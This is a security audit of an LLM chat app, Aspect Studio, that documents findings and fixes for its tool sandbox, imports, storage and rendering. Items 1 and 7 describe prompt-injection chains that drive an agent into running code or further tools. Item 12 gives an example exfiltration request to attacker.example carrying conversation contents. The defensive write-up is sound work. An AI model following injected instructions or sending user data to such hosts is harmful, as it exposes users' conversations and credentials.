# 🔒 Security Audit

Point-in-time review of the tool-execution, rendering, and storage surfaces in
Aspect Studio. Each finding below is tagged with its current status as of this
release.

### 1. [RESOLVED] Unsafe Tool Execution via `new Function` in Default Aspect Tools
- **Location:** `src/js/modules/aspects.js` — the built-in `Calculate.js` and `JSExecutor.js` tool templates shipped with the default Aspects.
- **Vulnerability Class:** Arbitrary Code Execution via chat-provided strings
- **Original Issue:** `Calculate.js` and `JSExecutor.js` evaluated a `code`/`expression` string supplied as a chat/tool argument using `new Function()`. Because that string effectively comes from the model's output (which can itself be steered by untrusted content the model reads, e.g. a fetched webpage), this let a prompt-injected response run arbitrary JavaScript inside the tool's Web Worker without the user ever reviewing the code first.
- **Fix Applied:**
  - `Calculate.js` now uses a small recursive-descent arithmetic parser (numbers, `+ - * / ( )` only) with no dynamic code evaluation.
  - `JSExecutor.js` no longer evaluates its `code` argument at all. It returns a clear `success: false` error explaining that dynamic execution of chat-provided strings is disabled, and directs the user to add real logic as a named custom tool instead (see item below for why that path is treated differently).
- **Note on `src/js/modules/tools.js` (`executeJavaScriptTool`):** This is the engine that runs *user-authored* custom tools (the "Injectable JS Tools" feature advertised in the README). It runs the tool's source as an inline `<script>` inside a locked-down sandboxed iframe, but this is by design, not a defect — the whole feature is "let the user write/upload a JS tool and run it." The user authors and reviews this code themselves before it's attached to an Aspect; it is not code an LLM can inject at chat time. Mitigations already in place: execution happens in an `about:srcdoc` `sandbox="allow-scripts"` iframe **without** `allow-same-origin`, so it gets a unique opaque origin — `localStorage`/`indexedDB` throw, there are no cookies, and there is no handle to the parent DOM; the iframe CSP is `connect-src 'none'` and `XMLHttpRequest`/`WebSocket`/`EventSource` are removed, so every network request is forced through a parent broker; and each tool communicates back only via a narrow `postMessage` protocol (result, memory read/write, aspect summon). Residual risk (a tool the user has reviewed and allowed onto the network can still `fetch`, so a malicious hand-authored tool could perform SSRF from the user's browser) is accepted as inherent to a "run my own local JS tools" feature, same as browser dev tools or a userscript manager — see item 5 for the per-origin scoping that limits it.

### 2. [NOT CURRENTLY EXPLOITABLE] innerHTML Concatenation in Workflow Builder
- **Location:** `src/js/modules/workflowBuilder.js`, `renderWorkflow()`.
- **Vulnerability Class:** DOM-based XSS (theoretical)
- **Analysis:** `node.configHtml` is concatenated into `innerHTML` without sanitization. However, `configHtml` is only ever set internally by `addWorkflowNode()` from a fixed switch over a small set of built-in node types (`start`, `fetch`, `extract`, `memory`, `custom`) — every value is a static template string. There is currently no feature that loads a workflow (or `configHtml`) from an imported `.aspect` file or any other untrusted source, so there is no reachable input path for an attacker to control this value today.
- **Guardrail for future work:** If workflow import/export or sharing is ever added, `configHtml` (or any node field rendered via `innerHTML`) must be sanitized with DOMPurify or built with `createElement`/`appendChild` before that lands, since at that point the value would become attacker-controllable.

### 3. [RESOLVED] Aspect Data Stored in `localStorage`
- **Location:** previously `src/js/modules/state.js` and `src/js/modules/aspects.js` (`aspects_data`).
- **Vulnerability Class:** Sensitive local data not isolated from script-level access; unbounded silent data loss.
- **Original Issue:** The entire Aspect library — names, instructions, knowledge, tool source, base64 icons and backgrounds, and full chat history — was serialised into a single `localStorage` key on every keystroke. Beyond the defence-in-depth concern, this had a more immediate failure mode: `localStorage` caps at roughly 5 MB per origin, the write had no error handling, and a single custom background image could push a library over the limit. Every write past that point threw and was swallowed, so the user's work stopped being saved with no indication.
- **Fix Applied:**
  - Aspects now live in IndexedDB (`src/js/modules/persist.js`, store `aspects`), alongside the knowledge and memory stores. Writes are debounced and errors surface rather than vanishing.
  - Existing users are migrated on first load. The original `localStorage` blob is preserved under `aspects_data_v1_backup` rather than deleted, so a migration problem is recoverable from the user's own browser.
  - `tests/persist.test.js` covers the round trip, the migration, and an ~8 MB library that the previous implementation could not have stored.

### 4. [ACCEPTED RISK — CHANGED DECISION] API Key Persistence
- **Location:** `src/js/modules/settings.js`, `src/js/modules/state.js`.
- **Previous behaviour:** the API key was explicitly never persisted (`localStorage.removeItem('apiKey')` on every save), so no credential was at rest.
- **Current behaviour:** the key is persisted in `localStorage` by default, behind a **Remember API key on this device** toggle in Settings. Turning it off falls back to `sessionStorage`, which is cleared when the tab closes.
- **Why this changed:** the previous posture made the app unusable as a daily driver — the key had to be retyped on every reload. This is the same trade-off every desktop LLM client makes, and it is now an explicit, reversible user choice rather than an invisible policy.
- **Scope of the exposure:** any script running on this origin could read the key. Per item 2 there is currently no reachable stored-XSS vector. The key is only ever sent as a bearer token to the endpoint the user configured. **Local providers (Ollama, LM Studio, llama.cpp, WebLLM) require no key at all** — `requiresApiKey()` in `providers.js` returns `false` for loopback, RFC1918, CGNAT, and `.local`/`.internal`/`.lan` hosts — so a purely local setup stores no credential regardless of this setting.
- **Guidance for users:** turn the toggle off on a shared or untrusted machine, or use a local provider, which needs no credential in the first place.

### 5. [BY DESIGN — SCOPED] Outbound Requests From Tool Code
- **Location:** `src/js/modules/tools.js` (`executeJavaScriptTool`, `brokerToolFetch`), `src/js/modules/toolSandbox.js`.
- **Analysis:** user-authored tools run in a sandboxed iframe (opaque origin, no DOM handle, no storage) and communicate only through a narrow `postMessage` protocol (result, memory read/write, aspect summon). The iframe's own CSP is `connect-src 'none'`; every request is handed to `brokerToolFetch` in the parent. They *can* still `fetch` through that broker, so a hand-authored tool can perform SSRF from the user's browser. This is inherent to a "run my own local JS tools" feature and is accepted, exactly as for a userscript manager or browser dev tools.
- **Scoping (this pass):** the network grant is now **per origin**, not per tool. `brokerToolFetch` derives the scheme+host of each request; a tool that the user allowed to reach `https://api.example.com` is re-prompted the first time it tries any other origin, so an innocuous-looking first request can no longer silently license later exfiltration to an attacker host. Approved origins are remembered on the tool (`allowedOrigins`) and cleared from the tool editor. `allowNetwork: true` set explicitly in the editor remains an "any origin" override; `false` blocks everything. Every outbound request is written into the transcript as a system-log line.
- **Import hardening (this pass):** `allowNetwork` and `allowedOrigins` are stripped from any tool that arrives via a shared library JSON file (see item 6), so a file cannot ship a pre-authorised network grant.
- **Change in an earlier pass:** the execution timeout is user-configurable (default 30s, previously a hard-coded 10s that made any network-using tool fail). The ceiling still exists; it is not unbounded.

### 6. [RESOLVED] Imported Tools Ran Without Review (`.aspect` and whole-library JSON)
- **Location:** `src/js/modules/zip.js` (`loadAspectFile`), `src/js/modules/persist.js` (`parseLibrary`), `src/js/modules/aspects.js` (`normalizeAspect`, `isToolTrusted`), `src/js/modules/tools.js` (`executeJavaScriptTool`).
- **Vulnerability Class:** Arbitrary code execution via a shared file.
- **Original Issue:** `.aspect` files (and the `*.aspects.json` whole-library export) are explicitly meant to be shared. Their tools are JavaScript that the model can invoke (`[Run Tool: …]`) with no user step in between. An importer who never opens the editor would never see the code before it ran — via `SummonAspect` a hostile tool could also spend the importer's API credits and exfiltrate the reply.
- **Fix Applied:**
  - Trust is per tool, keyed by an FNV-1a hash of the tool's exact source (`tool.trustedHash`). `isToolTrusted` runs a tool only if its current code still matches that hash, so any imported or since-edited tool is inert until reviewed. `aspect.toolsReviewed` is now only the coarse editor-banner hint.
  - `.aspect` import (`zip.js`) rebuilds every tool as `{ name, code, state }` and sets `toolsReviewed: tools.length === 0`.
  - Whole-library JSON import (`parseLibrary`) now does the same: it strips `trustedHash`, `allowNetwork`, `allowedOrigins` and any file-supplied `toolsReviewed` from every tool, keeping only `{ name, code, state }`, and marks the aspect unreviewed whenever it carries tools. Previously this path spread the raw record through, so a crafted file could ship a matching `trustedHash` (or `allowNetwork: true`) and have its tools run with no prompt.
  - The editor shows a warning banner with a "Trust & enable tools" button (a `confirm()` gate) that stamps `trustedHash` on each tool at its current code. Locally authored Aspects and older saves (no `toolsReviewed` field) are grandfathered in at load.
  - Trust fields are re-stripped on every import, so the gate re-applies on every machine a shared file lands on.

### 7. [RESOLVED] Tool Output Could Trigger Further Tool Execution
- **Location:** `src/js/modules/tools.js` (`processAIResponseAndTools`).
- **Vulnerability Class:** Prompt-injection → tool execution chain.
- **Original Issue:** the "agentic loop" scanned the *text* of every tool result for `[Run Tool: …]` and auto-executed any match. A tool that returned a fetched web page (or any attacker-influenced content) could therefore drive further tool calls with no model or user involvement.
- **Fix Applied:** chaining is now opt-in. A tool must return `{ "__aspectToolCalls": [ { "name", "args" } ] }` for the loop to continue; free-text output is never parsed for tool calls. The 15-iteration cap is unchanged.

### 8. [RESOLVED] A Transient IndexedDB Read Error Could Wipe the Library
- **Location:** `src/js/modules/persist.js`, `src/js/modules/aspects.js`.
- **Vulnerability Class:** Silent, total data loss.
- **Original Issue:** `loadAspects()` returned `[]` on *any* read error. The app could not tell "read failed" from "new user", rebuilt the default library, and the next debounced `saveAspects()` ran its purge step — deleting every real row it had just failed to read.
- **Fix Applied:**
  - Persistence is "armed" only after a load that actually succeeds (an empty result still counts as success). A genuine read failure disarms it, and `scheduleSave`/`flushSave` become no-ops until a later load succeeds or the user explicitly chooses "start fresh".
  - `loadAspects()` now throws on a real failure instead of returning `[]`; `loadDefaultAspects()` shows a blocking overlay (`#storage-error-overlay`) rather than building and persisting defaults.
  - `saveAspects()` skips its purge step entirely when handed an empty list.
  - Automatic rolling snapshots of the whole library (`snapshots` object store, newest 8) plus whole-library export/import are available under Settings → Backup & restore.
  - Covered by `tests/persist.test.js` ("persistence arming after a load failure").

### 9. [RESOLVED] Exported "Aspect Card" HTML Under-escaped; No App CSP
- **Location:** `src/js/modules/zip.js` (`exportAspectToWebpage`), `index.html` build output.
- **Fix Applied:**
  - The exported card now full-entity-escapes every interpolated field, validates the icon is a `data:image/…;base64,` URI before using it as `src`, and carries its own restrictive `Content-Security-Policy` meta.
  - `index.html` ships a baseline `Content-Security-Policy` meta for the case where it is served directly without `vite build`: `object-src 'none'`, `base-uri 'self'`, `frame-src 'self'`, `form-action 'none'`. It deliberately leaves `script-src`/`style-src`/`connect-src` open so `npm run dev` HMR still works.
  - The production build's Vite plugin **replaces** that baseline tag with the full strict policy: `default-src 'self'`, `worker-src 'self' blob:`, `script-src 'self' 'wasm-unsafe-eval' blob:`, `object-src 'none'`, `base-uri 'self'`, `frame-src 'self'`, `form-action 'none'`. `connect-src` stays `*` because the endpoint is user-configured. There is never more than one CSP tag in the output.

### 10. [BY DESIGN] Icon Generation Calls pollinations.ai
- **Location:** `src/js/modules/imagegen.js`, wired from the editor's "Generate icon" button.
- **Analysis:** this is the only outbound request the app makes that is not a chat completion to the user's own configured endpoint. It fires only on an explicit click, hits `https://image.pollinations.ai` (a free, keyless text-to-image service), and the description sent is whatever the user typed (defaulting to the Aspect's name/description). The result is fetched and inlined as a `data:` URI, so the stored Aspect never depends on an external URL. Covered by `connect-src *` in the app CSP (which is already open because the model endpoint is user-configured). Users who want zero third-party contact simply never press the button.

### 11. [RESOLVED] Whole-Library Import Re-Granted Tool Trust and Network Access
- **Location:** `src/js/modules/backup.js` (`importAllAspects`), `src/js/modules/persist.js` (`parseLibrary`).
- **Vulnerability Class:** Arbitrary code execution / data exfiltration via a shared file.
- **Original Issue:** *Settings → Backup & restore → Import Aspects file* passed each imported aspect straight through `normalizeAspect`, which grandfathered any tool whose `trustedHash` was unset and left a file-supplied `allowNetwork: true` intact. A shared `*.aspects.json` could therefore land pre-trusted, network-enabled tool code that ran in the sandbox with no review prompt — the exact attack the per-`.aspect` review gate exists to stop.
- **Fix Applied:** `parseLibrary` now sanitises every imported tool down to `{ name, code, state }` and forces `toolsReviewed: false` when tools are present, mirroring the `.aspect` path. `trustedHash`, `allowNetwork` and `allowedOrigins` from the file are discarded, so imported tools are inert until reviewed in the editor and their network access starts from zero. Covered by `tests/persist.test.js` ("parseLibrary — imported tool sanitisation").

### 12. [RESOLVED] Tool Network Grant Was All-or-Nothing and Permanent
- **Location:** `src/js/modules/tools.js` (`brokerToolFetch`), `src/js/modules/ui.js` (tool row network control).
- **Vulnerability Class:** Unrestricted data-exfiltration / browser-side SSRF channel.
- **Original Issue:** the first-use consent dialog showed one specific URL, but approving it set `tool.allowNetwork = true` for *every* subsequent URL, method and body for the life of the tool, with the response returned to the tool. An innocuous-looking `GET https://api.example.com` could be approved and a later call could `POST https://attacker.example/collect` with the conversation contents, unprompted.
- **Fix Applied:** the grant is scoped to the request's origin (scheme+host). A new origin re-prompts; approved origins accumulate in `tool.allowedOrigins` and are reset from the tool editor. `allowNetwork: true` set explicitly in the editor stays as a deliberate "any origin" override, `false` blocks all. Every outbound request is logged into the transcript. Covered by `tests/tools.test.js` ("brokerToolFetch — per-origin network grants").

---
*Last reviewed as part of the daily-driver hardening pass, then again for the codebase-audit remediation pass (findings F001–F011). Re-run this review if the workflow builder gains an import feature, or if any user-supplied HTML is added to the DOM without sanitization.*
